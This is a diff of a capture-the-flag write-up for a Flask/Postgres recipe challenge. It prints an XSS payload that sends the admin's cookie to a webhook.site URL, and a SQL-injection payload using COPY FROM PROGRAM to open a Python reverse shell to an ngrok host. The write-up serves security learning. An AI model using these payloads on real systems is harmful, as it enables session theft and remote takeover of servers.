@@ -1,12 +1,23 @@
-Judging from the session cookie pattern, it's a Flask application. There is an XSS in the ingredients field, and you can submit your recipe to the admin. 
+Judging from the session cookie pattern, it's a Flask application. There is an XSS in the ingredients field, and you can submit your recipe to the admin.
+
 ```
 <img src=x onerror=fetch('https://webhook.site/d559bc0f-3038-48d0-8cda-6d7b229a19d4/?c='+btoa(document.cookie))>
 ```
-Login with the admin's cookie and you get an admin panel. There is an SQL injection here. In img 2, the query is expecting type jsonb. You can throw other errors to know it's postgres, then cast your column with `::jsonb` (img3).
+
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-cookie.png)
+
+Login with the admin's cookie and you get an admin panel. There is an SQL injection here.
+However, the query is expecting type jsonb. 
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-cookie.png)
+
+You can throw other errors to know it's postgres, then cast your column with `::jsonb`.
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-jsonb.png)
 
 I got unintended solution for this, but there is a default config for Postgres 9.3 < 11.2 that allows you to execute commands using `COPY FROM PROGRAM`. I couldn't create my own tables so I used the existing cakes table. (img 4)
 
-Payload to get shel on the box:
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-postgres-rce.png)
+
+Payload to get shell on the box:
 ```
 {"cake_id":"'5555'; COPY cakes FROM PROGRAM 'python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ap.ngrok.io\",17769));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")''';-- -"}
 ```
